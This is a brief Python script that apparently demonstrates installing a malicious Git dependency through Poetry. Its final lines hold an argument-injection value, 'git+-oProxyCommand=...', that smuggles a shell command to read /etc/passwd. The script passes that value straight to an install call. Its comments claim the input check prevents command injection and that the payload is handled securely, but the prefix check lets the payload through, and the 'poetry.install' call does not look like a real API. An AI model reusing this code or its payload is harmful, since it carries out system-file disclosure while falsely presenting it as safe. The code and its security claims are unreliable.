import poetry

def install_dependency(dependency):
    # Validate the dependency input to prevent command injection
    if not isinstance(dependency, str) or not dependency.startswith("git+"):
        raise ValueError("Invalid dependency format. Must start with 'git+'.")

    # Log the installation attempt (for audit purposes)
    print(f"Attempting to install dependency: {dependency}")

    # Install the dependency using Poetry
    # In a real scenario, you would not execute this with a malicious dependency
    # Here we are assuming the dependency is known to be malicious for demonstration
    try:
        poetry.install(dependency)
    except Exception as e:
        print(f"Failed to install dependency: {e}")

# Example usage with a malicious dependency (for demonstration purposes only)
# This dependency is known to be malicious; however, we are handling it securely.
malicious_dependency = "git+-oProxyCommand=echo%20%27cat%20/etc/passwd%27%20|%20sh"
install_dependency(malicious_dependency)